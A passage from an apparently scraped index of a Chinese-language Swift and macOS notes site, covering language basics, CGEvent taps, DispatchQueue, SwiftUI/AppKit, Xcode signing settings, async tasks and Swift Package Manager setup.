的计算属性就是只读计算属性 属性观察器 属性观察器监控和响应属性值的变化 不需要为无法重载的计算属性添加属性观察器，因为可以通过 setter 直接监控和响应值的变化。 可以为属性添加如下的一个或全部观察器： willSet在设置新的值之前调用 didSet在新的值被设置之后立即调用 willSet和didSet观察器在属性初始化过程中不会被调用 Swift 方法 self 属性 类型的每一个实例都有一个隐含属性叫做self，self 完全等同于该实例本身，\n相当于Java的this 在实例方法中修改值类型 Swift 语言中结构体和枚举是值类型。一般情况下，值类型的属性不能在它的实例方法中被修改 若确实需要修改， 可以选择变异(mutating)这个方法，然后方法就可以从方法内部改变它的属性；\n并且它做的任何改变在方法结束时还会保留在原始结构中。\n方法还可以给它隐含的self属性赋值一个全新的实例，这个新实例在方法结束后将替换原来的实例 在可变方法中给 self 赋值 可变方法能够赋给隐含属性 self 一个全新的实例。 类型方法 就是类方法 Swift 下标 某些方面也可以理解为增加类似数组的功能 下标脚本允许你通过在实例后面的方括号中传入一个或者多个的索引值来对实例进行访问和赋值。 语法类似于实例方法和计算型属性的混合。 与定义实例方法类似，定义下标脚本使用subscript关键字，显式声明入参（一个或多个）和返回类型。 与实例方法不同的是下标脚本可以设定为读写或只读。这种方式又有点像计算型属性的getter和setter: subscript(index: Int) -> Int {\n    get {\n        // 用于下标脚本值的声明\n    }\n    set(newValue) {\n        // 执行赋值操作\n    }\n} 参考: https://www.runoob.com/swift/swift-subscripts.html 实例: import Cocoa\n\nstruct subexample {\n    let decrementer: Int\n    subscript(index: Int) -> Int {\n        return decrementer / index\n    }\n}\nlet division = subexample(decrementer: 100)\n\nprint(\"100 除以 9 等于 \\(division[9])\")\nprint(\"100 除以 2 等于 \\(division[2])\")\nprint(\"100 除以 3 等于 \\(division[3])\")\nprint(\"100 除以 5 等于 \\(division[5])\")\nprint(\"100 除以 7 等于 \\(division[7])\") 用法 根据使用场景不同下标脚本也具有不同的含义。 通常下标脚本是用来访问集合（collection），列表（list）或序列（sequence）中元素的快捷方式。 你可以在你自己特定的类或结构体中自由的实现下标脚本来提供合适的功能。 Swift 继承 继承 使用冒号 重写（Overriding） 子类可以通过继承来的实例方法，类方法，实例属性，\n或下标脚本来实现自己的定制功能，我们把这种行为叫重写（overriding）。 子类可以通过继承来的实例方法，类方法，实例属性，或下标脚本来实现自己的定制功能，\n把这种行为叫重写（overriding）。 防止重写 使用 final 关键字防止它们被重写。 Swift 构造过程 构造函数使用 init() 方法 类实例也可以通过定义析构器（deinitializer）在类实例释放之前执行清理内存的工作。 存储型属性的初始赋值 类和结构体在实例创建时，必须为所有存储型属性设置合适的初始值。 存储属性在构造器中赋值时，它们的值是被直接设置的，不会触发任何属性观测器。 存储属性在构造器中赋值流程： 创建初始值。 在属性定义中指定默认属性值。 初始化实例，并调用 init() 方法。 构造过程中修改常量属性 只要在构造过程结束前常量的值能确定，你可以在构造过程中的任意时间点修改常量属性的值 对某个类实例来说，它的常量属性只能在定义它的类的构造过程中修改；不能在子类中修改。 默认构造器 默认构造器将简单的创建一个所有属性值都设置为默认值的实例: 结构体的逐一成员构造器 如果结构体对所有存储型属性提供了默认值且自身没有提供定制的构造器，\n它们能自动获得一个逐一成员构造器 如: struct Rectangle {\n    var length = 100.0, breadth = 200.0\n}\nlet area = Rectangle(length: 24.0, breadth: 32.0)\n\nprint(\"矩形的面积: \\(area.length)\")\nprint(\"矩形的面积: \\(area.breadth)\") 值类型的构造器代理 构造器可以通过调用其它构造器来完成实例的部分构造过程。\n这一过程称为构造器代理，它能减少多个构造器间的代码重复。 构造器的继承和重载 Swift 中的子类不会默认继承父类的构造器。 父类的构造器仅在确定和安全的情况下被继承。 当你重写一个父类指定构造器时，你需要写override修饰符 可失败构造器 可以在一个类，结构体或是枚举类型的定义中，添加一个或多个可失败构造器。\n其语法为在init关键字后面加添问号(init?)。 Swift 析构过程 在一个类的实例被释放之前，析构函数被立即调用。 用关键字deinit来标示析构函数，类似于初始化函数用init来标示。析构函数只适用于类类型。 Swift 可选链 参考: https://www.runoob.com/swift/swift-optional-chaining.html 调用时候使用问号/叹号， 问号表示可能为空， 为空则不继续调用 叹号表示强制调用（最好确定一定可以调用） 注解 这点与ts基本一致 Swift 自动引用计数（ARC） Swift 使用自动引用计数（ARC）这一机制来跟踪和管理应用程序的内存 通常情况下我们不需要去手动释放内存，因为 ARC 会在类的实例不再被使用时，自动释放其占用的内存。 但在有些时候我们还是需要在代码中实现内存管理。 ARC 功能 当每次使用 init() 方法创建一个类的新的实例的时候，ARC 会分配一大块内存用来储存实例的信息。 内存中会包含实例的类型信息，以及这个实例所有相关属性的值。 当实例不再被使用时，ARC 释放实例所占用的内存，并让释放的内存能挪作他用。 为了确保使用中的实例不会被销毁，ARC 会跟踪和计算每一个实例正在被多少属性，常量和变量所引用。 实例赋值给属性、常量或变量，它们都会创建此实例的强引用，只要强引用还在，实例是不允许被销毁的。 类实例之间的循环强引用 循环引用， 永远不会被回收 Swift 提供了两种办法用来解决你在使用类的属性时所遇到的循环强引用问题 弱引用: weak var 变量 无主引用: unowned let 变量 弱引用和无主引用允许循环引用中的一个实例引用另外一个实例而不保持强引用。\n这样实例能够互相引用而不产生循环强引用。 对于生命周期中会变为nil的实例使用弱引用。\n相反的，对于初始化赋值后再也不会被赋值为nil的实例，使用无主引用。 循环强引用还会发生在当你将一个闭包赋值给类实例的某个属性，\n并且这个闭包体中又使用了实例 Swift 类型转换 Swift 语言类型转换可以判断实例的类型。也可以用于检测实例类型是否属于其父类或者子类的实例。 is: 检测值的类型 as: 转换类型 向下转型 向下转型，用类型转换操作符(as? 或 as!) 当你不确定向下转型可以成功时，用类型转换的条件形式(as?)。\n条件形式的类型转换总是返回一个可选值（optional value），\n并且若下转是不可能的，可选值将是 nil。 只有你可以确定向下转型一定会成功时，才使用强制形式(as!)。\n当你试图向下转型为一个不正确的类型时，强制形式的类型转换会触发一个运行时错误。 Any和AnyObject的类型转换 Swift为不确定类型提供了两种特殊类型别名： AnyObject可以代表任何class类型的实例。 Any可以表示任何类型，包括方法类型（function types）。 只有当你明确的需要它的行为和功能时才使用Any和AnyObject。\n在你的代码里使用你期望的明确的类型总是更好的。 Swift 扩展 扩展就是向一个已有的类、结构体或枚举类型添加新功能。 扩展可以对一个类型添加新的功能，但是不能重写已有的功能。 语法 扩展声明使用关键字 extension: extension SomeType {\n    // 加到SomeType的新功能写到这里\n} 一个扩展可以扩展一个已有类型，使其能够适配一个或多个协议，语法格式如下: extension SomeType: SomeProtocol, AnotherProctocol {\n    // 协议实现写到这里\n} 下面的例子向 Int 类型添加了 5 个计算型实例属性并扩展其功能: extension Int {\n  var add: Int {return self + 100 }\n  var sub: Int { return self - 10 }\n  var mul: Int { return self * 10 }\n  var div: Int { return self / 5 }\n}\n\nlet addition = 3.add\nprint(\"加法运算后的值：\\(addition)\") Swift 协议 应该就是接口吧 协议的语法格式如下: protocol SomeProtocol {\n    // 协议内容\n} 要使类遵循某个协议，需要在类型名称后加上协议名称，中间以冒号:分隔.\n遵循多个协议时，各协议之间用逗号,分隔: struct SomeStructure: FirstProtocol, AnotherProtocol {\n    // 结构体内容\n} 如果类在遵循协议的同时拥有父类，应该将父类名放在协议名之前，以逗号分隔: class SomeClass: SomeSuperClass, FirstProtocol, AnotherProtocol {\n    // 类的内容\n} 类专属协议 可以在协议的继承列表中,通过添加class关键字,限制协议只能适配到类（class）类型。 该class关键字必须是第一个出现在协议的继承列表中，其后，才是其他继承协议。格式如下: protocol SomeClassOnlyProtocol: class, SomeInheritedProtocol {\n    // 协议定义\n} Swift 泛型 类型约束 关联类 使用 associatedtype 关键字来设置关联类型实例 Where 语句 可以在参数列表中通过where语句定义参数的约束 Swift 访问控制 public        可以访问自己模块中源文件里的任何实体，别人也可以通过引入该模块来访问源文件里的所有实体。 internal      可以访问自己模块中源文件里的任何实体，但是别人不能访问该模块中源文件里的实体。 fileprivate   文件内私有，只能在当前源文件中使用。 private       只能在类中访问，离开了这个类或者结构体的作用域外面就无法访问。 枚举类型访问权限 枚举中成员的访问级别继承自该枚举，你不能为枚举中的成员单独申明不同的访问级别。 子类访问权限 子类的访问级别不得高于父类的访问级别。\n比如说，父类的访问级别是 internal，子类的访问级别就不能申明为 public。","tags":"后端","url":"/yq-docs-rear-end-swift-Basic-grammar.html","loc":"/yq-docs-rear-end-swift-Basic-grammar.html"},{"title":"事件类型","text":"HID 事件和会话事件 HID 事件（Human Interface Device Events） HID 事件是指由人机交互设备（如键盘、鼠标、触摸板等）产生的事件。 用途：通过截取 HID 事件，你可以监视和响应用户与输入设备的交互，例如按键、点击、滚动等操作。 会话事件（Session Events）： 会话事件是指与用户登录会话（session）相关的事件，如用户登录、注销、屏幕锁定等。 用途：会话事件主要用于监视和响应用户登录和注销等会话级别的操作，以便执行与会话状态相关的任务或逻辑。 区别： HID 事件是与人机交互设备（输入设备）相关的事件，而会话事件是与用户登录会话（session）相关的事件。 HID 事件是针对用户输入的响应，而会话事件是针对用户登录和注销等会话级别的操作的响应。 HID 事件可以截取和处理，以实现自定义的交互逻辑，而会话事件通常由系统或框架处理。","tags":"后端","url":"/yq-docs-rear-end-swift-Event.html","loc":"/yq-docs-rear-end-swift-Event.html"},{"title":"官方库","text":"UIKit 移动端用 Cocoa OS x桌面端用 包含 AppKit: 官方文档: https://developer.apple.com/documentation/appkit Foundation SwiftUI 较新的框架, 跨平台支持(桌面/移动) 一些库对象/函数 NSEvent 是Core Graphics框架提供的事件处理类。\n一个比较底层的事件类, 用于处理与图形渲染和窗口服务相关的事件。 CGEvent可以用于模拟和处理鼠标、键盘、触摸等低级输入事件。\n它提供了更底层的控制，可以直接操作事件的属性，如位置、按键状态等。 CGEvent AppKit框架提供的事件处理类. 是一个较高层的事件处理接口，用于处理与应用程序界面和用户交互相关的事件。\nNSEvent提供了一些高级的功能，如自动处理按键重复、多点触控、手势识别等。\n它还提供了更高级的事件处理方法，如响应链、事件分发等。 CGEvent.tapCreate 创建一个事件截取, 参考: https://developer.apple.com/documentation/coregraphics/cgevent/1454426-tapcreate 参数列表: (tap: CGEventTapLocation, place: CGEventTapPlacement, options: CGEventTapOptions, eventsOfInterest: CGEventMask, callback: CGEventTapCallBack, userInfo: UnsafeMutableRawPointer?) -> CFMachPort? 主要说一下 eventsOfInterest: CGEventMask ,\n这个是一个位掩码集合, 标识截取的事件类型, 比如 CGEventMask(1 << NSEvent.EventType.keyDown.rawValue) ,\n多个事件用 | 整合. 左移一位表示转换为位掩码 其中有一个参数Callable是个回调函数, 用于处理事件\n需要返回一个cgEvent的指针(),\n函数签名为 CGEventRef (*)(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) (返回一个CGEventRef对象，即一个CGEvent类型的引用) 回调函数负责创建和返回CGEventRef对象，并控制对该对象的内存管理 回调返回的cgEvent有两个可用的修饰: passRetained：在回调函数中，如果你使用passRetained来返回CGEventRef对象，它表示你将内存管理权转移给调用方。\n这意味着，调用方需要负责在适当的时候调用CFRelease来释放CGEventRef对象，以确保正确释放内存并避免内存泄漏。\n这通常适用于你在回调函数中创建了一个新的CGEventRef对象，并希望调用方负责管理其生命周期。 例如，如果你在回调函数中使用CGEventCreateCopy函数创建了一个新的事件副本，并通过passRetained返回，\n那么调用方需要负责在不再需要该事件时调用CFRelease来释放它。 passUnretained：在回调函数中，如果你使用passUnretained来返回CGEventRef对象，它表示你不会转移内存管理权给调用方。\n这意味着，调用方不需要调用CFRelease释放CGEventRef对象，因为你保留了对该对象的所有权。\n这通常适用于你在回调函数中返回了一个指向全局或静态变量的CGEventRef对象，\n或者你从其他地方获取的对象，而不是在回调函数中创建的新对象。 例如，如果你在回调函数中返回一个全局变量中存储的事件对象，或者你通过传递指针参数获取一个事件对象，\n然后使用passUnretained返回，那么调用方不需要调用CFRelease释放它。 综上所述，使用passRetained表示你将内存管理权转移给调用方，调用方需要负责释放对象。\n而使用passUnretained表示你保留了内存管理权，调用方无需释放对象。\n你应根据具体情况选择适当的内存管理方式，以确保正确处理内存生命周期。 (这部分来自AI) 注解 另外自己使用 CGEvent 时, 尽量不要去强转为 NSEvent: let nsEvent = NSEvent(cgEvent: cgEvent), 因为有时候在这转了后, 返回的cgEvent, 在底层调用可能会报错: Assertion failure in -[NSEvent _initWithCGEvent:eventRef:], NSEvent.m:1,846\n...\ncom.apple.NSEventThread (7): EXC_BREAKPOINT (code=1, subcode=0x18307be7c) Assertion failure in -[NSEvent _initWithCGEvent:eventRef:], NSEvent.m:1,846 DispatchQueue 执行任务的调度队列,\n支持异步执行 DispatchQueue 是一个用于执行任务的调度队列，它是在Grand Central Dispatch (GCD) 中提供的主要类之一。\nGCD是一个用于并发执行任务的底层系统框架，它提供了一种简单而强大的方式来管理并发任务的执行。 DispatchQueue 可以将任务（代码块）安排到不同的队列中，并按照特定的调度方式进行执行。它提供了两种类型的队列： Serial Queue（串行队列）：每次只能执行一个任务，按照任务添加的顺序进行执行。后一个任务会等待前一个任务完成后才能开始执行。 Concurrent Queue（并发队列）：可以同时执行多个任务，并且任务的执行顺序可能不确定。 你可以使用 DispatchQueue 来执行以下类型的任务： 同步任务（Sync Tasks）：任务会在当前线程中同步执行，直到任务执行完毕后才会继续执行后续代码。 异步任务（Async Tasks）：任务会在后台线程中异步执行，不会阻塞当前线程的执行，可以继续执行后续代码。 以下是一个使用 DispatchQueue 的简单示例: let queue = DispatchQueue(label: \"com.example.queue\")\n\n// 异步任务\nqueue.async {\n    // 在后台线程执行的任务\n    print(\"异步任务\")\n}\n\n// 同步任务\nqueue.sync {\n    // 在当前线程执行的任务\n    print(\"同步任务\")\n} DispatchQueue 还提供了其他功能，如延迟执行任务、调度任务在特定时间或间隔后执行等。\n它是在iOS、macOS、watchOS 和 tvOS 开发中进行异步和并发编程的重要工具之一。 比如延时执行也可以: // 延时执行任务\nDispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {\n    // 2秒后执行的任务\n    print(\"延时执行的任务\")\n} NSViewRepresentable 一个协议，用于在SwiftUI中封装和使用Cocoa（macOS）中的NSView。\n它允许开发者通过实现一些必要的方法来创建自定义的NSView，并将其嵌入到SwiftUI视图层级中。 通过遵循NSViewRepresentable协议，\n你可以创建一个遵循NSViewRepresentable协议的自定义结构体或类，然后实现以下两个必要的方法： makeNSView(context:)：在这个方法中，你需要创建并返回一个NSView实例。这个方法会在视图第一次被创建时调用。 updateNSView(_:context:)：在这个方法中，你可以根据需要更新NSView的属性和内容。这个方法会在视图的状态发生变化时被调用。 通过实现这些方法，你可以在SwiftUI中使用自定义的NSView，\n并在其中使用Cocoa（macOS）提供的各种功能和控件，以满足特定的需求。 View 视图顶级窗口, 注意, 没有提供默认的close方法, 因为官方觉得close不应该由View触发 可以通过以下代码获取到View所在窗体然后关闭: NSWindow(contentViewController: NSHostingController(rootView: self)) NSWindow AppKit的窗口管理 NSHostingController AppKit 中的类，用于在 macOS 应用程序中承载 SwiftUI 视图。 它是一个 AppKit 视图控制器，用于在 AppKit 应用程序中托管和管理 SwiftUI 视图。\n通过将 SwiftUI 视图嵌入到 NSHostingController 中，可以在 AppKit 应用程序的视图层次结构中使用 SwiftUI 视图。 ZStack与VStack ZStack 一个3D的布局方式, 比如有三个图标, 后者会叠放在前者上 VStack 垂直布局方式, 比如有三个图标, 后者会垂直排列与前者 支持的块 Settings 块 用于定义应用程序的设置场景，它是一个视图构造器，用于自定义应用程序的设置界面。\n通过在 Settings 块中添加视图来创建自定义的设置界面，以供用户配置和调整应用程序的各种选项。 WindowGroup 块 WindowGroup 块用于定义应用程序的主窗口场景。\n在 WindowGroup 块中，你可以指定应用程序的主窗口的内容视图以及其他与窗口相关的属性。 Scene 块 Scene 块用于定义应用程序的场景，它可以包含一个或多个窗口组。\n你可以在 Scene 块中定义应用程序的场景配置、窗口管理和生命周期处理。 NavigationView 块 NavigationView 块用于创建具有导航功能的视图层次结构。\n在 NavigationView 块中，你可以使用 NavigationView 的修饰符和子视图来定义导航栏、导航链接以及其他与导航相关的界面元素。 Form 块 Form 块用于创建表单视图，用于显示和收集用户的输入。\n在 Form 块中，你可以使用 Form 的修饰符和子视图来创建表单字段、分组和其他与表单相关的界面元素。 List 块 List 块用于创建可滚动的列表视图。\n在 List 块中，你可以使用 List 的修饰符和子视图来定义列表项、分组和其他与列表相关的界面元素。 ForEach 块 ForEach 块用于在列表或视图中迭代和显示集合中的元素。\n在 ForEach 块中，你可以使用 ForEach 的修饰符和子视图来定义每个元素的显示方式和交互行为。 SwiftUI 与 AppKit SwiftUI 和 AppKit 是 Apple 提供的两个不同的框架，\n用于构建 macOS 应用程序的用户界面。它们在设计和开发理念上有一些区别。 声明性 UI：SwiftUI 是一个基于声明性 UI 的框架，\n它使用简洁的代码和声明式的方式来描述用户界面。\n你可以使用 SwiftUI 的各种视图和修饰符来构建用户界面，\n并且它会自动处理视图状态和布局，以及与用户交互的响应。 而 AppKit 是一个基于命令式的 UI 框架，你需要编写更多的代码来手动管理视图的状态和布局。 跨平台支持：SwiftUI 是一个跨平台框架，\n除了 macOS，它还可以用于构建 iOS、iPadOS、watchOS 和 tvOS 应用程序。\n这意味着你可以使用相同的代码和技术来开发多个平台上的应用程序。 而 AppKit 是专门为 macOS 设计的框架，不支持其他平台。 响应式布局：SwiftUI 的布局系统是响应式的，\n它使用了一种叫做 \"容器视图\" 的概念，可以自动适应不同的屏幕尺寸和设备方向。\n这使得开发适应性更强的用户界面变得更加容易。 AppKit 的布局系统相对较为传统，需要手动处理不同的屏幕尺寸和设备方向。 预览功能：SwiftUI 提供了一个强大的预览功能，可以在开发过程中实时预览和调试用户界面。\n你可以在 Xcode 中查看 SwiftUI 视图在不同设备上的外观，并即时查看代码更改的效果。\n这对于迭代开发和快速调试非常有帮助。AppKit 并没有提供类似的预览功能。 尽管 SwiftUI 在设计上有一些新颖的概念和优势，\n但在某些情况下，仍然需要使用 AppKit 来构建更复杂和定制化的 macOS 应用程序。\nAppKit 拥有更多的功能和灵活性","tags":"后端","url":"/yq-docs-rear-end-swift-Official-library.html","loc":"/yq-docs-rear-end-swift-Official-library.html"},{"title":"swift结构体与类的使用区别","text":"结构体: 值类型, 当你创建结构体的实例时，它会创建该结构的深拷贝; 即使将其赋值给其他变量, 也是创建一个值的拷贝 结构体的成员默认是不可变的（immutable），除非你明确地使用关键字mutating来标记 结构体不能继承自其他结构体或类，也不能实现协议（protocol）。\n但是，你可以在结构体中定义一个名为init的函数来实现初始化逻辑。 类 引用类型, 当你创建类的实例时，它创建的是对类类型的引用(多个引用执行同一个值) 类的成员默认是可变的（mutable） 类可以继承自其他类或实现协议 使用场景 结构体：结构体通常用于表示简单的数据模型，\n如几何形状或货币单位，其中重点是数据而不是行为。\n结构体的行为通常通过函数和计算属性来定义。 类：类通常用于表示更复杂的概念，\n如人类、动物或汽车等，其中重点是行为和状态。\n类可以拥有实例方法和类方法，以及属性（可以是可变的或不可变的）。","tags":"后端","url":"/yq-docs-rear-end-swift-Swift-structure-and-class-difference.html","loc":"/yq-docs-rear-end-swift-Swift-structure-and-class-difference.html"},{"title":"一些好用三方库","text":"KeyboardShortcuts 键盘事件处理库: https://swiftpackageindex.com/sindresorhus/KeyboardShortcuts 支持全局快捷键的监听, 完美支持MacOS的沙盒","tags":"后端","url":"/yq-docs-rear-end-swift-Three--party-library.html","loc":"/yq-docs-rear-end-swift-Three--party-library.html"},{"title":"Xcode删除掉强制证书","text":"Xcode删除掉强制证书/删除掉强制团队验证 先关闭掉xcode项目, 然后用文本编辑器比如vscode打开\n项目配置文件 xxx.xcodeproj , 全局搜索并更新为以下字段: # 这个这样改\nCODE_SIGN_STYLE = Manual;\n\n# 这些直接删除也可\nCODE_SIGN_IDENTITY = \"\"\nDEVELOPMENT_TEAM = \"\"\nPROVISIONING_PROFILE_SPECIFIER = \"\"; 原来的内容也贴一下做个参考: CODE_SIGN_STYLE = Automatic;\n# 最主要就是这个和TEAM\nCODE_SIGN_IDENTITY = \"Apple Development\";\nDEVELOPMENT_TEAM = \"\";\nPROVISIONING_PROFILE_SPECIFIER = \"\"; 注解 不要在xcode项目打开的时候改, 不然会修改失败(多半会被内存中的覆盖掉) 重新打开xcode, 在 Target 中看看对不对, 不对就按这样选择 以及在 build setting 中的 Signing 设置下 注解 顺便吐槽一句, xcode 太难用","tags":"后端","url":"/yq-docs-rear-end-swift-Xcode-xcode-turtorial-delete-the-compulsory-certificate.html","loc":"/yq-docs-rear-end-swift-Xcode-xcode-turtorial-delete-the-compulsory-certificate.html"},{"title":"Swift异步","text":"于Python类似, 高版本也支持使用async(await)来定义(调用)异步函数: func fetchData() async -> String {\n    // 模拟异步操作，比如从网络获取数据\n    await Task.sleep(1_000_000_000) // 模拟1秒的延迟\n    return \"Data fetched successfully\"\n} 当在异步上下文中调用时, 除了直接await, 还可以: async {\n    print(\"Async code block\")\n    let result = try await someAsyncFunction()\n    print(\"Result: \\(result)\")\n} 如果要在同步上下文中调用, 可以使用 Task 或者 Task.runDetached : Task.runDetached {\n    print(\"Before calling asyncTask\")\n    await asyncTask()\n    print(\"After calling asyncTask\")\n}\n\nTask {\n    print(\"Before calling asyncTask\")\n    await asyncTask()\n    print(\"After calling asyncTask\")\n} 两者区别在于它们的任务分离性和运行方式 任务分离性： Task.runDetached: 创建一个分离的任务，该任务不会等待其完成，\n它会在后台执行，不会阻塞当前线程。\n这意味着主线程或当前上下文中的代码可以继续执行而不等待任务完成。 Task: 在当前上下文中创建一个任务，它的行为类似于一个子任务。\n如果你在一个任务中调用另一个任务，并使用 await 来等待它的完成，\n那么它会在当前任务中被等待，不会分离执行 运行方式： Task.runDetached: 会创建一个新的任务，并在后台运行，不影响当前任务的执行。\n这通常用于启动一个异步任务，而不需要等待它完成 Task: 在当前任务上下文中执行，如果使用 await 等待其完成，\n它会被等待执行完成后再继续当前任务的执行","tags":"后端","url":"/yq-docs-rear-end-swift-asynchronous.html","loc":"/yq-docs-rear-end-swift-asynchronous.html"},{"title":"桥接导入C","text":"注解 源于AI, 有空整理 如果你在 Swift 中使用桥接头文件来访问 C 头文件中的宏定义，你可以按照以下步骤进行操作： 创建桥接头文件 在 Xcode 中，创建一个新的头文件（例如 YourProject-Bridging-Header.h）。\n在桥接头文件中，使用 #import 或 #include 导入 libproc.h 头文件: #import <libproc.h> 配置桥接头文件： 在 Xcode 项目的 \"Build Settings\"（构建设置）中，\n找到 \"Objective-C Bridging Header\"（Objective-C 桥接头文件）设置。\n将设置的值指定为桥接头文件的路径，例如 YourProject/YourProject-Bridging-Header.h。 在 Swift 代码中使用宏定义 在 Swift 文件中，你可以通过桥接头文件来访问 libproc.h 中的宏定义。\n使用 #if 预处理指令来检查宏定义的值，并在代码中做出相应的处理: #if YOUR_MACRO\n    // 宏定义存在时的处理逻辑\n#else\n    // 宏定义不存在时的处理逻辑\n#endif 请注意，Swift 是一种不同于 C 的语言，因此在 Swift 文件中无法直接访问 C 头文件中的宏定义。\n通过桥接头文件，你可以在 Objective-C 和 Swift 之间建立连接，从而使 Swift 代码能够访问 C 头文件中的宏定义和其他内容。 确保在桥接头文件和 Swift 文件之间设置了正确的路径和配置，以便能够成功访问 libproc.h 中的宏定义","tags":"后端","url":"/yq-docs-rear-end-swift-turtorial-Bridge-guidance-C.html","loc":"/yq-docs-rear-end-swift-turtorial-Bridge-guidance-C.html"},{"title":"命令行工具-创建并运行项目","text":"官网: https://www.swift.org/getting-started/cli-swiftpm/ 平台: MacOS 以创建一个 Hello World 作为说明 项目创建与运行 创建项目: $ mkdir MyCLI\n$ cd MyCLI\n$ swift package init --name MyCLI --type executable 生成以下结构目录文件: .\n├── Package.swift\n└── Sources\n    └── main.swift 执行程序: $ swift run MyCLI\nBuilding for debugging...\n[3/3] Linking MyCLI\nBuild complete! (0.68s)\nHello, world!","tags":"后端","url":"/yq-docs-rear-end-swift-turtorial-Command-lines-create-and-run-the-project.html","loc":"/yq-docs-rear-end-swift-turtorial-Command-lines-create-and-run-the-project.html"},{"title":"DEBUG条件","text":"用于设置如果是开发(DEBUG)中该做什么,\n正式环境该做什么, 如: #if DEBUG\n  print(\"可能没有获取到辅助权限, 确认后请清理后手动获取\")\n#else\n  // 打开请求辅助权限窗口\n  let _ = NoAccessView().openInWindow(title: \"请求授权\", sender: self)\n#endif 如何配置? 打开, 程序配置页面, 选择 Build Settings , 然后可以在 Filter 中\n搜索 Custom Flags 如图所示, 还需在 Other Swift Flags 中\n设置 Debug 添加 -D DEBUG , 注意不要和Release一起添加","tags":"后端","url":"/yq-docs-rear-end-swift-turtorial-Debug-condition.html","loc":"/yq-docs-rear-end-swift-turtorial-Debug-condition.html"},{"title":"增加依赖","text":"方案一 - Xcode: 选择菜单栏的 File > Add Package Dependency , 然后输入仓库URL 参考: https://developer.apple.com/documentation/xcode/adding-package-dependencies-to-your-app 如果没找到的话(不知道为什么我就没有这个项),\n就去项目的 General , 下拉找到 Frameworks, Libraries, and Embedded Content , 如图: 然后添加依赖即可 效果就是在根目录下增加一个 Package.resolved 文件: {\n  \"pins\" : [\n    {\n      \"identity\" : \"keyboardshortcuts\",\n      \"kind\" : \"remoteSourceControl\",\n      \"location\" : \"https://github.com/sindresorhus/KeyboardShortcuts.git\",\n      \"state\" : {\n        \"revision\" : \"c252200141e4abaecf30c14ea474dc009f56d553\",\n        \"version\" : \"1.16.1\"\n      }\n    }\n  ],\n  \"version\" : 2\n} 方案二 - 官方包(文件)管理器: 项目根创建 Package.swift 定义依赖项和版本 内容例(主要是两个 dependencies 以及 头部的版本定义): // swift-tools-version: 5.8\n// The swift-tools-version declares the minimum version of Swift required to build this package.\n\nimport PackageDescription\n\nlet package = Package(\n    name: \"CQ\",\n    dependencies: [\n        // 指定 tag\n        .package(url: \"https://github.com/sindresorhus/KeyboardShortcuts.git\", from: \"1.16.1\"),\n        // 或者指定 branch\n        // .package(url: \"https://github.com/sindresorhus/KeyboardShortcuts.git\", branch: \"main\")\n    ],\n    targets: [\n        // Targets are the basic building blocks of a package, defining a module or a test suite.\n        // Targets can depend on other targets in this package and products from dependencies.\n        .executableTarget(\n            name: \"CQ\",\n            dependencies: [\n                .product(name: \"KeyboardShortcuts\", package: \"keyboardshortcuts\")\n            ],\n            path: \"CQ\"),\n    ]\n) 定义好之后执行 swift build 即可 注解 Xcode编辑器可能会提示 PackageDescription 找不到 的报错, 忽略即可 创建发布可参考: https://www.jianshu.com/p/44560fd214d2 部分属性说明: name: 一般就是产品/项目名 dependencies: 依赖路径,\n支持多种路径类型: git 源 + 确定的版本号 git 源 + 版本区间 git 源 + Commit 号 git 源 + 分支名 本地路径 targets: 目标, 可以有多个 targets.name: name targets.dependencies: 与上面的依赖不一样,\n可以依赖上面 Package.Dependency 的东西或者依赖另一个 target。\n所以这里只需要写 Package 或者 Target 的名字字符串（Target.Dependency 这个枚举也实现了 ExpressibleByStringLiteral）。 targets.path: target 的路径，默认为 [PackageRoot]/Sources/[TargetName] targets.source: 源文件路径，默认 TargetName 文件夹下都是源代码文件，会递归搜索 targets.exclude: 需要被排除在外的文件/文件夹，这些文件不会参与编译。 targets.publicHeadersPath: C 家族库的公共头文件地址。 targets.swiftSettings: 定义一个用于特定环境（例如 Debug）的宏，需要设置的话可以去 API 上研究下 targets.linkerSettings: 用于链接一些系统库 这个我失败了不知道为什么 方案三 - Pod管理器: 类似于Java的Maven 安装配置使用参考 包管理工具pod","tags":"后端","url":"/yq-docs-rear-end-swift-turtorial-Increase-dependence.html","loc":"/yq-docs-rear-end-swift-turtorial-Increase-dependence.html"},{"title":"使用SPM(Swift Package Manager)","text":"Swift Package Manager (SPM) 注解 源于AI, 有空整理 如果你想在 Swift Package Manager (SPM) 中导入 C 代码，你可以按照以下步骤进行操作： 创建 Swift 包 在你的项目目录中，打开终端或命令提示符。\n使用 cd 命令导航到你的项目目录。\n运行以下命令创建一个新的 Swift 包: swift package init 或者直接在xcode创建 配置 Swift 包 在项目目录中，使用文本编辑器打开 Package.swift 文件。\n在 Package.swift 文件中，配置 Swift 包的名称、目标和依赖项等信息。\n在 targets 数组中，定义你的目标及其相关设置，例如模块名称、源文件路径等。 在 Swift 包中创建 C 源文件 在你的 Swift 包目录中，创建一个包含 C 代码的源文件，例如 YourPackage/Sources/YourPackage/CFile.c。\n在 C 源文件中，编写你的 C 代码。 更新 Swift 包配置文件 在 Package.swift 文件中，将 C 源文件添加到 Swift 包的目标中。\n修改 targets 数组中的目标配置，添加 C 源文件的路径: // Package.swift\n\n// ...\n\ntargets: [\n    .target(\n        name: \"YourPackage\",\n        dependencies: [],\n        cSettings: [\n            .headerSearchPath(\"YourPackage/Sources/YourPackage\"),\n            .unsafeFlags([\"-Xclang\", \"-fmodule-map-file=YourPackage/Sources/YourPackage/module.modulemap\"]),\n        ]\n    ),\n    // ...\n], 创建模块映射文件 在 Swift 包目录中，创建一个名为 module.modulemap 的模块映射文件，\n例如 YourPackage/Sources/YourPackage/module.modulemap。\n在模块映射文件中，指定你的 C 源文件的导入方式: // module.modulemap\n\nmodule YourPackage [system] {\n    header \"CFile.h\"\n    export *\n} 导入 C 代码 在你的 Swift 代码中，使用 import 语句导入你的 Swift 包。\n现在你可以在 Swift 代码中使用导入的模块和其中的 C 代码: // Swift 代码\n\nimport YourPackage\n\n// 使用导入的模块和其中的 C 代码 通过以上步骤，你可以使用 Swift Package Manager 导入和使用 C 代码。\n确保在 Swift 包的配置文件中正确指定了 C 源文件的路径，并使用模块映射文件来定义导入方式。 请注意，使用 Swift Package Manager 导入 C 代码需要适当的配置和目录结构，\n并且需要在模块映射文件中正确定义 C 源文件的导入方式。\n确保你的 C 代码可以正确编译和链接，并在 Swift 